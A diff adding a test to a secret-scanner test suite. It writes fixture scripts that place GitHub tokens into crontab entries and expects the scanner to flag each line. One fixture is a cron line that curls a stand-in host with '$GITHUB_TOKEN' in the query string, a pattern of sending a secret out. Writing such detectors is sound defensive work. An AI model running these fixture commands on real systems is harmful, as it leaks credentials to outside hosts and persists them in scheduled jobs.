@@ -1094,6 +1094,56 @@ describe('hard-coded example secret scanner', () => {
     expect(result.stderr).toContain('scripts/install-tee-cron.sh:7');
   });
 
+  it('rejects joined aliases, nonliteral sinks, incremental args, shell URLs, and optional env access', () => {
+    const root = makeFixtureRoot();
+    const scriptDir = join(root, 'scripts');
+    mkdirSync(scriptDir, { recursive: true });
+    writeFileSync(
+      join(scriptDir, 'install-joined-cron.py'),
+      [
+        "args = ['agy', 'pr', '--token', os.environ['GITHUB_TOKEN']]",
+        "entry = f\"0 3 * * * {' '.join(args)}\"",
+        "subprocess.run(['/usr/bin/crontab', '-'], input=entry)",
+      ].join('\n'),
+      'utf8',
+    );
+    writeFileSync(
+      join(scriptDir, 'install-joined-cron.mjs'),
+      [
+        'const credential = process?.env?.GITHUB_TOKEN;',
+        'const schedule = process.argv[2];',
+        'const entry = `${schedule} agy pr --token ${credential}`;',
+        "spawnSync('/usr/bin/crontab', ['-'], { input: entry });",
+        "const ghArgs = ['auth'];",
+        "ghArgs.push('token');",
+        "const secondCredential = execFileSync('gh', ghArgs);",
+        'const second = `0 4 * * * agy pr --token ${secondCredential}`;',
+        "execSync(`printf '%s\\n' ${second} | crontab -`);",
+      ].join('\n'),
+      'utf8',
+    );
+    writeFileSync(
+      join(scriptDir, 'install-url-cron.sh'),
+      [
+        "auth=\"$(/usr/bin/env gh auth token)\"",
+        'CRON_CMD="0 5 * * * agy pr --token $auth"',
+        "crontab - <<CRON",
+        '* * * * * curl https://example.invalid/?token=$GITHUB_TOKEN',
+        'CRON',
+      ].join('\n'),
+      'utf8',
+    );
+
+    const result = runScanner(root);
+
+    expect(result.status).toBe(1);
+    expect(result.stderr).toContain('scripts/install-joined-cron.py:3');
+    expect(result.stderr).toContain('scripts/install-joined-cron.mjs:4');
+    expect(result.stderr).toContain('scripts/install-joined-cron.mjs:8');
+    expect(result.stderr).toContain('scripts/install-url-cron.sh:2');
+    expect(result.stderr).toContain('scripts/install-url-cron.sh:4');
+  });
+
   it('allows quoted runtime env-file credentials in shell cron commands and heredocs', () => {
     const root = makeFixtureRoot();
     const scriptDir = join(root, 'scripts');
